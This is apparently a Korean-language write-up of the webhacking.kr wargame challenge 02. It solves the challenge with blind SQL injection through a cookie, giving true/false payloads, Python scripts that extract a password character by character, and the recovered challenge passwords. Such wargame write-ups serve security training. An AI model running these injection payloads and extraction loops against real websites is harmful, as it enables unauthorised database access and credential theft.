================================================================================================================
[webhacking.kr] 02
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8 -> step10 -> step12;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9 -> step11 -> step13;
        }
        step0 -> step1[label="time = '1 and 1=1'",arrowhead="normal"];
        step3 -> step2[label="Error Page",arrowhead="normal"];
        step4 -> step5[label="time = 1 and (select if(length(password)>8,1,0) from FreeB0aRd)",arrowhead="normal"];
        step7 -> step6[label="Data Length",arrowhead="normal"];
        step8 -> step9[label="time = 1 and (select ascii(substr(password,%d,1)) from FreeB0aRd)=%d",arrowhead="normal"];
        step11 -> step10[label="Data Extract",arrowhead="normal"];

    }

|

server -> DB 예측
================================================================================================================

- 해당 html 소스 내에 주석 처리된 부분에 time이 출력되는 것을 볼 수 있는데, 쿠키 값에 time이 설정되어 있는 것으로 보아 해당 쿠키 값이 페이지 상에 출력되는 것으로 추측됩니다.

.. code-block:: SQL
    
    SELECT * FROM tb_name where
    time=$_COOKIE['time']


|

COOKIE Injection
================================================================================================================

- Cookie 값 입력을 통해 True/False 여부를 확인합니다.

.. code-block:: console

    time = '1 and 1=1'  // True: <!--2070-01-01 09:00:01-->
    time = '1 and 1=2'  // False: <!--2070-01-01 09:00:00-->

|

- 테이블 명과 컬럼 명은 유추를 통해 확인할 수 있습니다.
- 테이블명: FreeB0aRd
- 컬럼명: password

|

and select
================================================================================================================

- 데이터 길이 확인: 9

.. code-block:: python

    import requests

    cookie = {
        "PHPSESSID":"di0tppi0hjd8prirqbkkl6isj2",
        "time":"1 and (select if(length(password)>8,1,0) from FreeB0aRd)"
    }
    url = "http://webhacking.kr/challenge/web/web-02/index.php"
    r = requests.get(url,cookies=cookie, verify=False)
       
    print r.content.split('<!--')[1].split('-->')[0]

|

and select
================================================================================================================

- 데이터 추출
- FreeB0aRd password : 7598522ae

.. code-block:: python

    import requests

    pw =""
    for i in range(1,10):
        for j in range(33,126):
            #print j
            cookie = {
                "PHPSESSID":"di0tppi0hjd8prirqbkkl6isj2",
                "time":"1 and (select ascii(substr(password,%d,1)) from FreeB0aRd)=%d" % (i,j)
            }

            url = "http://webhacking.kr/challenge/web/web-02/index.php"
            r = requests.get(url,cookies=cookie, verify=False)
            q = r.content.split('<!--')[1].split('-->')[0]
            if "09:00:01" in q:
                pw += chr(j)
                print pw
                break

    print pw

|

admin 패스워드 값 확인
================================================================================================================


- 확인된 패스워드를 패스워드가 걸려있는 게시판에 입력한 결과 하나의 다운로드 링크가 존재한다.
- 페이지에서 파일을 다운 받으면 __AdMiN__FiL2.zip 이라는 압축 파일이 존재하는데 해당 파일이 암호가 걸려있다.
- 해당 파일에 대한 패스워드는 admin 페이지에 존재하는 것으로 추측되며 admin 페이지 패스워드를 위와 같은 방식으로 찾는다.
- admin password: 0nly_admin

.. code-block:: html
    admin page

    Notice
    -관리자 패스워드가 유출되지 않게 조심하세요.
    -처음 사용하시는 분은 메뉴얼을 참고하세요.(메뉴얼 패스워드 : @dM1n__nnanual)


해당 패스워드로 압축 파일을 해제하면 인증 패스워드를 확인할 수 있다.
